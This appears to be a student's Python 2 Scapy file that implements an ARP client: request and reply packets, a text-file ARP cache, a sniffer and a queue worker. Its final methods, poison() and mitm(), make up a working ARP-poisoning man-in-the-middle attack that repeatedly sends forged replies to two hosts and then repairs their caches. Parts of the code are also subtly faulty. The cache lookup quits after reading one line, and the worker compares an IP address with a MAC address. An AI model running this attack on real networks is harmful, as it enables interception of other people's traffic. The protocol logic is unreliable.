# Title: ARP Protocol
# Author: Sam Mishra - N12140743

#############################################################################
#############################################################################
###[ SCAPY ARP FIELDS ]###
	
 #-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+#
 # Title (Corresponding Field Name) :		             Default                #
 #-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+#
 # hwtype													  :		              0x001                 #
 # ptype													 	:	         0x0800, ETHER_TYPES          #
 # hlen													 	  :			              6                   #
 # plen													 	  :			              4                   #
 # op (oper)												: 			            1                   #
 #																		"who-has":1, "is-at":2, "RARP-req":3, #
 #																		   "RARP-rep":4, "Dyn-RARP-req":5,    #
 #																		  "Dyn-RAR-rep":6, "Dyn-RARP-err":7,  #
 #																		     "InARP-req":8, "InARP-rep":9	    #
 # hwsrc	(sha)											:                                       #
 # psrc (spa)											  :			             pdst                 #
 # hwdst (tha)											:		             ETHER_ANY              #
 # pdst (tpa)											  :		              0.0.0.0               #
 #-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+#

#############################################################################
#############################################################################
#############################################################################

from scapy.all import *
from Queue import Queue
from threading import Thread, Timer, Lock
import shared_functions as sf
import os
import os.path
import time

###[ arpclient ]###
# Create an instance of arpclient
# Takes a Name of a Network Interface as an Argument 
#		(defaults to eth0) ==> this is Machine Dependent
class arpclient:
	def __init__(self, interface='eth0'):
		# Initialize Some Traits For Each Instance of arpclient
		self.cwd = os.getcwd()
		self.parentdir = '/'.join(self.cwd.split('/')[:-1])
		self.resourcedir = os.path.join(self.parentdir, 'resources')
		self.arpcache = os.path.join(self.resourcedir,'arpcache.txt')
		self.arppoisonrepair = os.path.join(self.resourcedir,'fix.txt')
		self.interface = interface
		self.arprequest = ''
		self.arpreply = ''
		self.arppoison= ''
		#		Broadcast Addresses
		self.broadcast_mac = 'ff:ff:ff:ff:ff:ff'
		self.broadcast_ip = '255.255.255.255'
	
		# 	get_interface_ip and get_interface_mac are both 
		# 	found in shared.functions.py.  Each take the interface 
		#		that was specified during the initialization of the 
		#		current instance of arpclient and return that interfaces
		# 	ip and mac address respectively. 
		interface_ip = sf.get_interface_ip(interface)
		interface_mac, readable_interface_mac = sf.get_interface_mac(interface)
		self.interface_ip = interface_ip
		self.interface_mac = [interface_mac,readable_interface_mac]

		# Queue for Recieved ARP Messages
		self.arpqueue=Queue(6)
		self.lock=Lock()

		# More Readable Versions of Class Trait Variables 
		# (for copying and pasting)
		broadcastMAC = self.broadcast_mac
		broadcastIP = self.broadcast_ip
		myMAC = self.interface_mac[1]
		myIP = self.interface_ip

###[ request ]###
# Create and Send an ARP Request Packet to the IP Address Specified
	def request(self,requestIP):
		# More Readable Versions of Class Trait Variables
		broadcastMAC = self.broadcast_mac
		broadcastIP = self.broadcast_ip
		myMAC = self.interface_mac[1]
		myIP = self.interface_ip

		ethernet = Ether(dst=broadcastMAC,src=myMAC)
		arp = ARP(op="who-has",hwsrc=myMAC,psrc=myIP,pdst=requestIP)
				# No Hardware Destination is Specified in an ARP Request
		self.arprequest = ethernet/arp

		print 'Broadcasting:   Who Has {0}?'.format(requestIP)
		results,unanswered = srp(self.arprequest, verbose=0)
	
		return results

###[ reply ]###
# Create and Send an ARP Reply Packet to the IP,MAC Address Pair
	def reply(self,requestingIP,requestingMAC):
		# More Readable Versions of Class Trait Variables
		myMAC = self.interface_mac[1]
		myIP = self.interface_ip

		ethernet = Ether(dst=requestingMAC,src=myMAC)
		arp = ARP(op="is-at",hwsrc=myMAC,psrc=myIP,
												 hwdst=requestingMAC,pdst=requestingIP)
		self.arpreply = ethernet/arp

		print 'To {0:15}:\t{1:15} is at {2:16}'.format(requestingIP,myIP,myMAC)
		sendp(self.arpreply, verbose=0)

###[ querycache ]###
	def querycache(self,service,ip='',mac=''):
		# Service [1,2,3]
		# 1 - Displacy Cache
		# 2 - Query - returns mappings, reports if mapping fails
		# 3 - Worker Query - calls updatequery if mapping fails
		if service == 1:
			arpcache = open(self.arpcache,'r')
			for line in arpcache:
				print line
			arpcache.close()
		if service == 2:
			arpcache = open(self.arpcache,'r')
			if((len(ip)>0 and len(mac)==0) or (len(ip)==0 and len(mac)>0)):
				if len(ip)>0:
					for line in arpcache:
						if ip in line:
							print line
							arpcache.close()
							return 1,line # Have Address
						arpcache.close()
						return 0,0 # Dont Have Address
				if len(mac)>0:
					for line in arpcache:
						if mac in line:
							print line
							arpcache.close()
							return 1,line # Have Address
						arpcache.close()
						return 0,0 # Dont Have Adress
			else: 
				arpcache.close()
				return -1 # Error
		if service == 3:
			arpcache = open(self.arpcache,'r')
			if(len(ip)>0 and len(mac)>0):
				for line in arpcache:
					ipentry = line.split(',')[0]
					macentry = line.split(',')[1]
					if(ipentry == ip): # If Queried IP Address In Cache 
						if(macentry == mac): # And If It Is Mapped To Queried MAC
							arpcache.close()
							return 0 # Have Mapping.
						else:	# Else Mapping != Message Addresses, Rewrite Stale Entry
							arpcache.seek(0)
							temp = arpcache.readlines()
							arpcache.close()

							self.lock.acquire()
							try:
								arpcache = open(self.arpcache,'w')
								for line in temp:
									if ip not in line: # Remove Entry
										arpcache.write(line)
								arpcache.close()
								self.updatecache(1,ip,mac) # Update Cache
							finally:
								self.lock.release()
								return 2 # An Entry Was Overwritten

				self.lock.acquire() # No Entry For This IP Address
				try:
					arpcache.close()
					self.updatecache(1,ip,mac)
				finally:
					self.lock.release()
					return 1 # An Entry Was Added

			else:	
				arpcache.close()
				return -1	# Error

###[ updatecache ]###
	def updatecache(self,service, ip, mac):
		if service == 1: # Add an ARP Table Entry
			arpcache = open(self.arpcache,'a')
			string = [ip,',',mac,'\n']
			string = ''.join(string)
			arpcache.write(string)
			arpcache.close()
			print 'An Entry Was Added...'

		if service == 2: # Remove an ARP Table Entry
			arpcache = open(self.arpcache,'r')
			if(len(ip)>0 and len(mac)>0):
				for line in arpcache:
					ipentry = line.split(',')[0].strip()
					macentry = line.split(',')[1].strip()
					if(ipentry == ip): # If Queried IP Address In Cache 
						if(macentry == mac): # And If It Is Mapped To Queried MAC
							arpcache.seek(0)
							temp = arpcache.readlines()
							arpcache.close()
							arpcache = open(self.arpcache,'w')
							for line in temp:
								if ip not in line: # Write All Lines But The One That Matches
									arpcache.write(line)
							arpcache.close()
							print 'An Entry Was Removed...'
							return
			else:
				arpcache.close()

###[ listen ]###
 # Listens for and passes ARP Messages
	def listen(self):
		print 'Listening...'
		sniff(filter="arp",store=0,prn=self.parse)

###[ parse ]###
# Only handles ARP request and ARP reply messages
 	def parse(self,packet):
		if packet[ARP].op in (1,2):
			arptuple = (packet[ARP].op,packet[ARP].hwsrc,packet[ARP].psrc,
									packet[ARP].hwdst,packet[ARP].pdst)
			self.arpqueue.put(arptuple)
			print 'Received an ARP Packet...'
			return 1 # Received Packet
		else: 
			return 0 # Drop packet

###[ worker ]###
# Handles Queued ARP Messages, Maintaining ARP Cache
	def worker(self):
		myMAC = self.interface_mac[1]
		myIP = self.interface_ip
		arptuple = self.arpqueue.get()

		if arptuple[0] == 1: # 'who-has' case
			theirIP=arptuple[2]
			theirMAC=arptuple[1]
			self.querycache(3,theirIP,theirMAC)
			lookingFor=arptuple[4]
			if lookingFor == myMAC:
				self.reply(arptuple[2],arptuple[1])
				return 2 # 'who-has' queried, generated a reply
			return 0 # saw a 'who-has' packet
		elif arptuple[0] == 2: # 'is-at' case
			theirIP=arptuple[2]
			theirMAC=arptuple[1]
			self.querycache(3,theirIP,theirMAC)
			return 1 # saw a 'is-at' packet
		else: 
			return -1 # Error

###[ ping ]###

###[ poison ]###
 # An ARP Poisoning Attack on a, making a think b's MAC Address is Ours
	def poison(self,aIP,aMAC,bIP):
		myMAC = self.interface_mac[1]
		myIP = self.interface_ip

		ethernet = Ether(dst=aMAC,src=myMAC)
		arp = ARP(op="is-at",hwsrc=myMAC,psrc=bIP,hwdst=aMAC,pdst=aIP)

		self.arppoison = ethernet/arp
		print 'To {0:15}:\t{1:15} is at {2:16}'.format(aIP,bIP,myMAC)
		sendp(self.arppoison, verbose=0)

###[ mitm ]###
 # Poisons two hosts to convinve both hosts that we are the other host 
	def mitm(self,aIP,aMAC,bIP,bMAC,timeout=40):
		myMAC = self.interface_mac[1]
		print 'Beginning MitM Attack...'
		try:
			while True:
				self.poison(aIP,aMAC,bIP)
				self.poison(bIP,bMAC,aIP)
				time.sleep(timeout)
		except KeyboardInterrupt:
			print '\nAttack killed!'
		finally:
			ethernet = Ether(dst=aMAC,src=bMAC)
			arp = ARP(op="is-at",hwsrc=bMAC,psrc=bIP,hwdst=aMAC,pdst=aIP)
			self.repairb = ethernet/arp

			ethernet = Ether(dst=bMAC,src=aMAC)
			arp = ARP(op="is-at",hwsrc=aMAC,psrc=aIP,hwdst=bMAC,pdst=bIP)
			self.repaira = ethernet/arp

			for i in range(3):
				print 'To {0:15}:\t{1:15} is at {2:16}'.format(aIP,bIP,bMAC)
				print 'To {0:15}:\t{1:15} is at {2:16}'.format(bIP,aIP,aMAC)
				sendp([self.repaira,self.repairb], verbose=0)
				time.sleep(40)

